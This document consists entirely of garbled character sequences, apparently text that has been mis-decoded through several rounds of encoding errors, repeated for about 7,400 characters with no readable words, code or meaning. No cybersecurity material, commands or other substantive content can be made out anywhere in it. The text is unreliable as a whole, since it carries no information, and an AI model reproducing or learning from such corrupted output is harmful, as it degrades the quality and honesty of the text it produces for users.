Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬ ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ÃƒÂ¢Ã¢â‚¬Å¾Ã‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¾Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¾ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬ ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ÃƒÂ¢Ã¢â‚¬Å¾Ã‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã‚Â¦ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¡ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¦ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¡ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬ ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ÃƒÂ¢Ã¢â‚¬Å¾Ã‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¾Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã¢â‚¬Â¦Ãƒâ€šÃ‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€šÃ‚Â¦ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¡ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬ ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ÃƒÂ¢Ã¢â‚¬Å¾Ã‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã‚Â¦ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¡ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã¢â‚¬Â¦Ãƒâ€šÃ‚Â¡ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬ ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ÃƒÂ¢Ã¢â‚¬Å¾Ã‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¾Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¾ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬ ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ÃƒÂ¢Ã¢â‚¬Å¾Ã‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã¢â‚¬Â¦Ãƒâ€šÃ‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã¢â‚¬Â¦Ãƒâ€šÃ‚Â¾ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬ ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ÃƒÂ¢Ã¢â‚¬Å¾Ã‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¾Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã¢â‚¬Â¦Ãƒâ€šÃ‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€šÃ‚Â¦ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¡ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬ ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ÃƒÂ¢Ã¢â‚¬Å¾Ã‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã‚Â¦ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¡ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã¢â‚¬Â¦Ãƒâ€šÃ‚Â¡ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬ ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ÃƒÂ¢Ã¢â‚¬Å¾Ã‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¾Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¾ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬ ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ÃƒÂ¢Ã¢â‚¬Å¾Ã‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã‚Â¦ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¡ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã¢â‚¬Â¦Ãƒâ€šÃ‚Â¡ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬ ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ÃƒÂ¢Ã¢â‚¬Å¾Ã‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¾Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã¢â‚¬Â¦Ãƒâ€šÃ‚Â¡ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬ ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ÃƒÂ¢Ã¢â‚¬Å¾Ã‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã‚Â¦ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¡ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¦ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¡ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬ ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ÃƒÂ¢Ã¢â‚¬Å¾Ã‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã‚Â¦ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¡ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã¢â‚¬Â¦Ãƒâ€šÃ‚Â¡ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬ 